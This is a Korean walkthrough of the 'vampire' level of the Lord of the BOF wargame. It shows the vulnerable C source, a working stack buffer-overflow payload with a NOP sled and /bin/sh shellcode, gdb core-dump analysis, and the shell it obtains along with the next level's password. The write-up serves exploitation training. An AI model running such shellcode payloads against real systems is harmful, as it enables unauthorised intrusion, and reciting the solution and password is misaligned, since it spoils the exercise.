# troll -> vampire
``` C
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```
vampire.c 코드는 위와 같다.
```
 if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }
```
이러한 조건 때문에 0xbfff영역을 사용하지 못한다.
```
[troll@localhost troll]$ cd /tmp/dirvampire
[troll@localhost dirvampire]$ cp ~/vampire .
[troll@localhost dirvampire]$ ./vampire `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"+"\x90"*100000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA¿¿¿¿1ÀPh//shh/bin‰ãPS‰á‰Â°
                                                                      Í€
Segmentation fault (core dumped)
[troll@localhost dirvampire]$ gdb -q -c core
Core was generated by `'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
(gdb) x/x $esp
0xbffe74a0:     0x90909090
```
위의 payload를 보면 NOP을 10만개를 입력하여 스택 프레임을 크게 하였다. 그리고 core 파일을 통해 주소를 확인해 보면
0xbffe 영역을 사용하고 있는 것을 알 수 있다. 스택이 커질수록 낮은 주소를 사용하는 점을 이용하면 금방 풀 수 있는 문제이다.
NOP을 10만개 해주었으니 0xbffe 중 거의 아무곳이나 return address로 해도 상관 없다.
```
[troll@localhost troll]$ ./vampire `python -c 'print "A"*44+"\xa0\x74\xfe\xbf"+"\x90"*100000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA tþ¿1ÀPh//shh/bin‰ãPS‰á‰Â°
                                                                      Í€
bash$ my-pass
euid = 509
music world
```
stack의 특성을 잘 이해하면  풀 수 있는 문제이다.








